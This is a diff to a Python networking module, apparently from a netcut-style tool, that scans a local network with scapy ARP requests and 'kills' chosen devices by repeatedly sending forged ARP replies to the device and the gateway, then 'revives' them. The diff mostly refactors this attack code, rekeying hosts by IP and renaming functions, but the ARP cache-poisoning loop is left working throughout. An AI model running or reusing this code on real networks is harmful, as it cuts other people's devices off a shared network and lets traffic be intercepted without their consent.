@@ -3,7 +3,7 @@ import logging
 logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
 import os
 
-from ipaddress import IPv4Interface
+from ipaddress import IPv4Interface, ip_address
 from manuf import MacParser
 from scapy.all import ARP, Ether, conf, getmacbyip, send, srp
 from subprocess import check_output
@@ -24,7 +24,7 @@ class Network():
         'SonyInte': 'PS'
     }
 
-    get = {}
+    get = {'hosts': {}}
 
     @classmethod
     def initialize(cls):
@@ -34,6 +34,12 @@ class Network():
         cls.get_interface()
         cls.get_gateway()
         cls.get_hosts()
+
+        if (Settings.get['DEBUG']):
+            print(f"{'':2}(d) Network.get['interface']:")
+            print(f"{'':4}{cls.get['interface']}")
+            print(f"{'':2}(d) Network.get['gateway']:")
+            print(f"{'':4}{cls.get['gateway']}")
 
     @classmethod
     def cleanup(cls):
@@ -72,13 +78,20 @@ class Network():
             verbose = False
         )[0]
 
-        cls.get['hosts'] = [ {
-            'ip': h[1].psrc,
-            'mac': h[1].hwsrc,
-            'vendor': cls.__mac_parser.get_manuf(h[1].hwsrc),
-            'vendor_long': cls.__mac_parser.get_manuf_long(h[1].hwsrc),
-            'vendor_tagged': cls.tag_vendor(cls.__mac_parser.get_manuf(h[1].hwsrc))
-        } for h in ans ]
+        ip_lengths = []
+        for h in ans:
+            ip = h[1].psrc
+            mac = h[1].hwsrc
+            ip_lengths.append(len(ip))
+            cls.get['hosts'][ip] = {
+                'ip': ip,
+                'mac': mac,
+                'vendor': cls.__mac_parser.get_manuf(mac),
+                'vendor_long': cls.__mac_parser.get_manuf_long(mac),
+                'vendor_tagged': cls.tag_vendor(cls.__mac_parser.get_manuf(mac))
+            }
+        cls.get['ip_list'] = sorted(ip_address(h[1].psrc) for h in ans)
+        cls.get['max_ip_length'] = max(ip_lengths)
 
         return cls.get['hosts']
 
@@ -123,16 +136,14 @@ class Network():
 
     @classmethod
     @threaded
-    def kill(cls, host_index):
+    def kill(cls, host):
         """
         Spoof given host by poisoning ARP cache repeatedly.
         This method runs in thread.
         """
-        host = cls.get['hosts'][host_index]
-
         # Check if host already been killed
         if (host['mac'] in cls.__killed):
-            print(f"'{host['mac']} - {host['vendor']}' is already killed")
+            print(f"{'':2}'{host['mac']} - {host['vendor']}' is already killed")
             return
         cls.__killed[host['mac']] = True
 
@@ -150,44 +161,21 @@ class Network():
         }
 
         # Poison ARP cache
-        print(f"'{host['mac']} - {host['vendor']}' is killed")
+        print(f"{'':2}'{host['mac']} - {host['vendor']}' is killed")
         while (host['mac'] in cls.__killed):
             if (not Settings.get['SAFE_MODE']):
                 send(packets['host'], verbose=False)
                 send(packets['gateway'], verbose=False)
                 sleep(Settings.get['DELAY'])
-        print(f"'{host['mac']} - {host['vendor']}' is un-killed")
-
-    @classmethod
-    def spoof(cls, host_index):
-        """
-        Spoof and un-spoof host with 'WAIT_DURATION' in settings.
-        Take host index and fetch host dictionary to pass along.
-        """
-        cls.kill(int(host_index))
-        sleep(Settings.get['WAIT_DURATION'])
-        cls.unkill(int(host_index))
-
-    @classmethod
-    def tag_vendor(cls, vendor):
-        """
-        Tag matched vendor.
-        Return extended name.
-        """
-        tagged = vendor
-        if (vendor in cls.__vendor_tags):
-            tagged = f"{vendor} ({cls.__vendor_tags[vendor]})"
-        return tagged
+        print(f"{'':2}'{host['mac']} - {host['vendor']}' is revived")
 
     @classmethod
     @threaded
-    def unkill(cls, host_index):
+    def revive(cls, host):
         """
         Un-spoof given host by stopping spoof thread.
         This method runs in thread.
         """
-        host = cls.get['hosts'][host_index]
-
         del cls.__killed[host['mac']]
 
         packets = {
@@ -209,3 +197,24 @@ class Network():
         if (not Settings.get['SAFE_MODE']):
             send(packets['host'], verbose=False)
             send(packets['gateway'], verbose=False)
+
+    @classmethod
+    def spoof(cls, host):
+        """
+        Spoof and un-spoof host with 'WAIT_DURATION' in settings.
+        Take host index and fetch host dictionary to pass along.
+        """
+        cls.kill(host)
+        sleep(Settings.get['WAIT_DURATION'])
+        cls.revive(host)
+
+    @classmethod
+    def tag_vendor(cls, vendor):
+        """
+        Tag matched vendor.
+        Return extended name.
+        """
+        tagged = vendor
+        if (vendor in cls.__vendor_tags):
+            tagged = f"{vendor} ({cls.__vendor_tags[vendor]})"
+        return tagged
